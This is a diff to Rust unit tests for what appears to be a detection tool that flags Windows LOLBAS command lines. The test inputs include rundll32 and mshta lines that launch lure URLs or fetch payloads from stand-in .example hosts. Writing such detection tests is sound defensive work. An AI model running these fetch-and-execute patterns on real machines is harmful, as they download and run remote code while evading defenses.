@@ -10019,11 +10019,9 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
 
     #[test]
     fn rundll32_fileprotocolhandler_url_emits_url_launch() {
+        let raw = "rundll32 url.dll,FileProtocolHandler https://rundll32-direct.example/lure.pdf";
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            "rundll32 url.dll,FileProtocolHandler https://rundll32-direct.example/lure.pdf",
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -10034,6 +10032,13 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
         assert!(
             has,
             "rundll32 FileProtocolHandler URL launch not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 FileProtocolHandler URL launch not marked as LOLBAS: {:?}",
             env.traits
         );
     }
@@ -10082,11 +10087,9 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
 
     #[test]
     fn rundll32_scrobj_generatetypelib_url_argument_emits_download() {
+        let raw = r#"rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj.example/payload.exe"#;
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj.example/payload.exe"#,
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -10097,6 +10100,13 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
         assert!(
             has,
             "rundll32 scrobj GenerateTypeLib URL download not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 scrobj GenerateTypeLib URL not marked as LOLBAS: {:?}",
             env.traits
         );
     }
@@ -10142,6 +10152,7 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
 
     #[test]
     fn rundll32_quoted_downloaded_dll_with_spaces_resolves_url() {
+        let raw = r#"rundll32 "C:\Users\Public\stage one.dll",EntryPoint"#;
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
             r#"c:\users\public\stage one.dll"#.to_string(),
@@ -10149,10 +10160,7 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
                 src: "https://rundll32-space.example/stage.dll".to_string(),
             },
         );
-        interpret_line(
-            r#"rundll32 "C:\Users\Public\stage one.dll",EntryPoint"#,
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -10162,6 +10170,13 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
                 )
             }),
             "rundll32 did not resolve downloaded DLL path: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 downloaded DLL path not marked as LOLBAS: {:?}",
             env.traits
         );
     }
